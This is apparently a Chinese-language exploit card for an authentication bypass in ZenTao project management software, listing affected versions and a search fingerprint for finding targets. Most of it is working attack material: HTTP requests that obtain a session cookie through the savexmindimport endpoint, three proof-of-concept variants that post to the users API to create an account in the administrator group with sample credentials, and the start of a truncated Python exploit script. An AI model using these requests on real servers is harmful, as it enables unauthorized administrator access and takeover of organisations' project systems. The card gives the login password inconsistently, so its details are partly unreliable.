# 禅道api.php存在未授权登入漏洞

- **系统**：禅道　|　**类型**：未授权访问　|　**CVE**：—
- **指纹**：`title=“禅道”`
- **请求**：`GET /zentaopms/www/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=upkbbehwgfscwizoglpw&branch=zqbcsfncxlpopmrvchsu HTTP/1.1`
- **关键头**：`id: ChanDao_PermissionBypass`　`name: ChanDao_PermissionBypass`　`author: XC`　`severity: medium`　`description: chandao_permissionbypass api.php`

**请求体 / payload**
```
**POC1:**
Host:
Set-Cookie: zentaosid=c5gfr88h22f4vv73h4d0b453mv;
构造数据包，创建账户
POST /zentaopms/www/api.php/v1/users HTTP/1.1
Host:ip
Cookie: zentaosid=c5gfr88h22f4vv73h4d0b453mv; lang=zh-cn; device=desktop; theme=default
{"account": "longl", "password": "Qwe123", "realname": "longl", "group":"1"}
"group":"1"为管理员分组
登入账号
账号：longl
密码：Qwest23
**POC2:**
GET /zentao/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=dddidkyodsnfamzvjidb&branch=klmnehgxnsmeuhshbooy HTTP/1.1
Host:
发起的请求中如果携带了默认的cookie 需要删除再发送请求
创建账号可以直接构造POC
POST /zentao/api.php/v1/users HTTP/1.1
Host:
Cookie: zentaosid=上一部获取的有效cookie;
Content-Length: 88
{"account":"rootroot","password":"Qwe123","realname":"rootroot","role":"","group":"1"}
然后即可成功登录。
**POC3:**
获取cookie
GET /zentao/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=jtexhqkbflxckrrolpbc&branch=luqmyuqbafmjejbvjixf HTTP/1.1
Host: {{hostname}}
获得Cookie: zentaosid=002c78f075e326c5cb0f496e8c30066a
绕过测试
GET /zentao/api.php/v1/lists HTTP/1.1
Cookie: zentaosid=002c78f075e326c5cb0f496e8c30066a
Host: {{hostname}}
显示为无接口，并不是未授权即可。
添加用户接口测试
POST /zentao/api.php/v1/users HTTP/1.1
Cookie: zentaosid=XXXXXXX
Host: {{hostname}}
{"account":"test","password":"admin@123",
"realname":"test",
"role":"",
"group":"2"
返回201Created即证明添加用户成功。
# -*- coding: UTF-8 -*-
# !/usr/bin/python
import requests
import re
from bs4 import BeautifulSoup
def getCookie(host):
"""
通过发送请求获取Set-Cookie头部信息。
:param host: 目标主机地址
:return:…（脚本共 3720 字，完整版见原文）
```
- **预期**：200　|　—

**其他**
- 影响范围: v16.x <= 禅道 < v18.12 （开源版）
v6.x <= 禅道 < v8.12 （企业版）
v3.x <= 禅道 < v4.12 （旗舰版）